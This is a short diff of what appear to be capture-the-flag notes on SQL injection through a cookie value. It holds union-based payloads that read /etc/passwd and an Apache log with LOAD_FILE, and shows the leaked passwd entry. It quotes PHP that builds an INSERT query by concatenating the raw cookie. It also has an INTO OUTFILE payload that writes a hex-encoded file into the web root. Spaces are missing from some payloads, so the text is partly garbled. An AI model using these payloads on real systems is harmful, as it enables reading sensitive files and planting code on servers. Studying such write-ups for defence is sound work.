@@ -43,18 +43,22 @@ Try sqlinjection read files
 Cookie:id='unionselect1,LOAD_FILE("/var/log/apache2/access.log")---
 
 Cookie:id='unionselect1,LOAD_FILE("/etc/passwd")---
-```	SUCESS
-	dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash```
+```
+SUCESS
 
-LOADindex.php
-	require_once"config.php";
+dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
+```
 
-	if(!isset($_COOKIE["id"])){
-		$cookie=bin2hex(random_bytes(16));
-		$queueNum=rand(1,100);
-		setcookie("id",$cookie,NULL,"/");
-		
-		$sql="INSERTINTOqueueVALUES('".$cookie."',".
+LOAD index.php
+
+require_once"config.php";
+
+if(!isset($_COOKIE["id"])){
+$cookie=bin2hex(random_bytes(16));
+$queueNum=rand(1,100);
+setcookie("id",$cookie,NULL,"/");
+
+$sql="INSERTINTOqueueVALUES('".$cookie."',".
 
 UPLOAD FILES in HEX
 Cookie:id='unionselect1,0x48656c6c6f20776f726c640aINTOOUTFILE'/var/www/html/test.php'---
